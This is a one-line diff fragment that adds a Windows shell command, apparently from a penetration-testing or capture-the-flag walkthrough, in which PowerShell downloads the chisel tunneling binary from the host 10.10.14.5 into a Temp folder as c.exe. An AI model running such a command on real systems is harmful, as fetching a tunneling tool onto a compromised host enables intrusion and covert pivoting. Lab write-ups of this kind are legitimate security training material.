@@ -1,0 +1,1 @@
+\Local\Temp> powershell -c "wget 10.10.14.5/chisel_windows_amd64.exe -o c.exe"
